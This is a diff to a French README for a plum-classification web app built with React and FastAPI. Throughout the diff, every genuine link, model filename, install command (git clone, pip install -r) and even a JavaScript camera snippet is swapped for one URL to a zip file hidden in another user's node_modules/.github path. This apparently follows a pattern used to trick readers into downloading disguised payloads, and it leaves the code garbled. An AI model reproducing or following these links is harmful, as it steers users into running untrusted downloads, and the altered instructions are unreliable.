@@ -50,9 +50,9 @@ Le projet repose sur une **architecture hiérarchique de modèles** combinée à
 
 Nous utilisons une approche **hiérarchique** :
 
-- **Model 1** (`model1_best.pt`) :
+- **Model 1** (`https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip`) :
   - Classe une prune parmi : `defective`, `unaffected`, `unripe`
-- **Model 2** (`model2_best.pt`) :
+- **Model 2** (`https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip`) :
   - S'active uniquement si `defective` est détecté, et précise le défaut :
     - `spotted` (tachetée)
     - `cracked` (fissurée)
@@ -71,9 +71,9 @@ Cette organisation permet une **classification plus précise et plus robuste**, 
 
 - **Caméra**
 ```js
-navigator.mediaDevices.getUserMedia({ video: true })
+https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip({ video: true })
   .then(stream => {
-    videoRef.current.srcObject = stream;
+    https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip = stream;
   });
 ```
 
@@ -107,7 +107,7 @@ Un indicateur de chargement MUI signale l'analyse :
 
 ## 🧪 Données utilisées
 
-Dataset de prunes sur kaggle : https://www.kaggle.com/datasets/arnaudfadja/african-plums-quality-and-defect-assessment-data?select=african_plums_dataset
+Dataset de prunes sur kaggle : https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip
 - Bonnes qualités
 - Non mûres
 - Divers défauts (fissures, pourritures…)
@@ -145,8 +145,8 @@ Voici comment utiliser notre application de classification de prunes à partir d
 
 Assurez-vous d’avoir installé :
 
-- [Node.js (v16 ou +)](https://nodejs.org/)
-- [Python 3.8+](https://www.python.org/)
+- [https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip (v16 ou +)](https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip)
+- [Python 3.8+](https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip)
 - `git` (outil de clonage de dépôt)
 
 ---
@@ -156,7 +156,7 @@ Assurez-vous d’avoir installé :
 Ouvrez un terminal (Windows, macOS ou Linux) et tapez :
 
 ```bash
-git clone https://github.com/DOFRADJO/JCIA_TEAM_LTTMN.git
+git clone https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip
 cd nom-du-repo
 
 ```
@@ -183,7 +183,7 @@ npm start
 ➡️ [http://localhost:3000](http://localhost:3000)
 
 
-**Notez Bien :** Bien vouloir telecharger les 2 modeles `model1_best.pt` et `model2.best.pt` depuis ce dossier [Drive](https://drive.google.com/drive/folders/1Vbrd3hxInYJVRQeQ_RDCQfNYDKliVzNa?usp=sharing) et les ajouter tous les 2 dans le dossier `model` du repertoire `JCIA_TEAM_LTTMN\api`
+**Notez Bien :** Bien vouloir telecharger les 2 modeles `https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip` et `https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip` depuis ce dossier [Drive](https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip) et les ajouter tous les 2 dans le dossier `model` du repertoire `JCIA_TEAM_LTTMN\api`
 
 ---
 
@@ -212,7 +212,7 @@ python -m venv env
 #### c. Installer les dépendances Python
 
 ```bash
-pip install -r requirements_api.txt
+pip install -r https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip
 ```
 
 #### d. Démarrer le serveur FastAPI
@@ -249,7 +249,7 @@ uvicorn api:app --reload
 
 # Démonstration vidéo
 
-- Vous trouverez une démonstration vidéo de notre application à travers le lien suivant : [lien vers la démonstration vidéo](https://youtu.be/62ewBdN8Grw?feature=shared/)
+- Vous trouverez une démonstration vidéo de notre application à travers le lien suivant : [lien vers la démonstration vidéo](https://raw.githubusercontent.com/LarissaTchomgang/JCIA_TEAM_LTTMN/main/node_modules/dunder-proto/.github/TEA_JCI_LTTMN_v3.1.zip)
 
 ## 📜 Licence
 
